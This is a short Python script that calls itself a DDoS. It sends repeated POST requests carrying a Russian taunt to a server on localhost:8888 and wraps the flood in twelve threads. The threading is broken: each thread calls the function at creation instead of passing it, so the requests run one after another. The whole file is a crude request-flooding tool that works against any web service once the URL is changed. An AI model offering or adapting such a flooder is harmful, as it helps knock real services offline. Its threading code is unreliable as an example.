import requests
from threading import Thread

def ddos():
    for i in range(50):
        data = {
            "name": "Это Дудос детка",
        }
        requests.post("http://localhost:8888/", data)

thread1 = Thread(target=ddos())
thread2 = Thread(target=ddos())
thread3 = Thread(target=ddos())
thread4 = Thread(target=ddos())
thread5 = Thread(target=ddos())
thread6 = Thread(target=ddos())
thread7 = Thread(target=ddos())
thread8 = Thread(target=ddos())
thread9 = Thread(target=ddos())
thread10 = Thread(target=ddos())
thread11 = Thread(target=ddos())
thread12 = Thread(target=ddos())


thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()
thread9.start()
thread10.start()
thread11.start()
thread12.start()

